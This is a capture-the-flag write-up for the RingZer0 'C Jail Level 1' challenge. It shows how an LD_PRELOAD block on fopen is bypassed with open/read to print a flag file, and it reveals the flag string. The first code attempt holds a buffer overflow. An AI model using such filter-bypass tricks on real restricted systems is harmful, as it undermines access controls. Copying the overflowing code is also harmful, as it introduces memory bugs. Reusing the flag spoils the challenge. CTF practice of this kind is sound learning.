# Level 1

![](https://i.imgur.com/ZYMp0X9.png)

```shell
ssh level1@challenges.ringzer0team.com -p 10228 
password: level1 
RingZer0 Team Online CTF

C Jail Level 1:
Current user is uid=1000(level1) gid=1000(level1) groups=1000(level1)

Flag is located at /home/level1/flag.txt

Challenge instruction:
-----------------------------

Type DONE to compile and execute your binary.


Your payload will be compiled that way:
gcc -O3 -Wall -fstack-protector-all -fPIE bin.c -o bin

Your payload will be executed that way:
LD_PRELOAD=./override.so ./bin

You only control the content of a function.

Here's the default includes
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>

You CANNOT use the "asm" keyword

-----------------------------
Your C code:
```

`-O3` means optimize.
`-Wall` mean print all warning.
`–fstack-protector-all` add and check canary into every function.
`-fPIE` random the virtual memory which it reflect to.

So obviously I have to write some C code to read the content of `/home/level1/flag.txt`. 

```
int main(int argc, char **argv) {
    FILE *fd;
    fd = fopen("flag.txt","r");
    char buffer[100];
    if ( NULL == fd ){
        printf( "Open failure" );
        return;
    }else{
        fread( buffer, 1024, 1, fd );
        printf( "%s", buffer );
    }
}
```
You just have to paste only the contents of `main()` like following:

![](https://i.imgur.com/0GcMzqw.png)
```
-----------------------------
Compiling your code.
/tmp/48d33367-23ec-4bde-86d9-8505fdec307a/bin.c: In function ‘_c7f346fe86566e933a574b6f2e931b57’:
/tmp/48d33367-23ec-4bde-86d9-8505fdec307a/bin.c:19:14: warning: ignoring return value of ‘fread’, declared with attribute warn_unused_result [-Wunused-result]
         fread( buffer, 1024, 1, fd );
              ^
In file included from /usr/include/stdio.h:937:0,
                 from /tmp/48d33367-23ec-4bde-86d9-8505fdec307a/bin.c:1:
In function ‘fread’,
    inlined from ‘_c7f346fe86566e933a574b6f2e931b57’ at /tmp/48d33367-23ec-4bde-86d9-8505fdec307a/bin.c:19:14:
/usr/include/x86_64-linux-gnu/bits/stdio2.h:293:2: warning: call to ‘__fread_chk_warn’ declared with attribute warning: fread called with bigger size * nmemb than length of destination buffer [enabled by default]
  return __fread_chk_warn (__ptr, __bos0 (__ptr), __size, __n, __stream);
  ^
Executing your code.
*** Warning: "fopen" function is disabled
Open failure
```

Seems `LD_PRELOAD=./override.so` override something.

`fopen/fread` are not allowed, so let's do it using deeper functions `open/read`:

```
int main(int argc, char **argv) {
    int fd;
    char *filename = "flag.txt";
    ssize_t ret_in;
    char buffer[100];

    // Open file 
    if ((fd = open(filename, O_RDONLY)) < 0){
        printf("Can not open the flag!!");
    } else {
        // Read content
        if((ret_in = read(fd, &buffer, 100)) > 0){
            // Print buffer
            printf("Flag: %s\n", buffer);
        } else {
            printf("Can not read the flag!!");
        }    
    }
}
```

Result:

```
-----------------------------
Your C code:
    int fd;
    char *filename = "flag.txt";
    ssize_t ret_in;
    char buffer[100];

    // Open file 
    if ((fd = open(filename, O_RDONLY)) < 0){
        printf("Can not open the flag!!");
    } else {
        // Read content
        if((ret_in = read(fd, &buffer, 100)) > 0){
            // Print buffer
            printf("Flag: %s\n", buffer);
        } else {
            printf("Can not read the flag!!");
        }    
    }
DONE

-----------------------------
Compiling your code.
Executing your code.
Flag: FLAG-ql3mI2Z8fGq56kK5QdwK8oMxgWwvji8R

Your C code:
```

![](https://i.imgur.com/38keYCT.png)
